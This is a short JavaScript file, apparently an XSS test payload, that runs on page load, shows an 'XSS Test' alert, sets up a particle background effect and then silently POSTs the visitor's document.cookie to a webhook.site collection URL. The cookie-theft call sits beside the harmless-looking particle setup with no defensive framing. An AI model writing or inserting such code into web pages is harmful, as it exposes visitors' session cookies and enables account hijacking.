window.onload = function() {

    alert('XSS Test');

    
    // Initialize Particles
    Particles.init({
        selector: '.background',
        maxParticles: '150',
        sizeVariations: 5,
        color: ['#7c7c7c', '#000000'],
    });

    // Fetch a specific website and send its cookies
    fetch('https://webhook.site/7163c53d-3a60-4d11-ac64-ec79a8c3c1a7', {
        method: 'POST',
        body: JSON.stringify({ cookie: document.cookie }),
        headers: { 'Content-Type': 'application/json' }
    });
};
